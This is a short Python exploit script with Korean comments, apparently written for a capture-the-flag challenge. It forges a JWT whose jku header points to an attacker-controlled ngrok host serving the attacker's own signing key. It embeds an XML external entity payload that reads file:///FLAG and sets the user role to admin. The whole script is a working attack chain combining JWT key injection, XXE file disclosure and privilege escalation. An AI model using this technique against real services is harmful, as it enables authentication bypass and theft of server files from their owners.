import jwt
import datetime
import json
# private.key 읽기
with open("private.key", "r") as f:
    private_key = f.read()

user_info_real = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///FLAG">
]>
<user>
    <user_id>&xxe;</user_id>
    <username>admin</username>
    <role>admin</role>
</user>"""
# payload
payload = {
    "user_info": user_info_real,
    "user_role": "admin",  # 여기도 "admin"으로 변경
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
    "iat": datetime.datetime.utcnow()
}

# header (주의: jku는 ngrok 주소로 바꿔야 함!)
headers = {
    "alg": "RS256",
    "typ": "JWT",
    "cty": "application/xml",
    "jku": "https://455e-115-91-214-2.ngrok-free.app/jwks.json",  # ✅ 너 ngrok 주소로 수정
    "kid": "attacker-key"
}

# JWT 생성
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=headers
)

print(token)
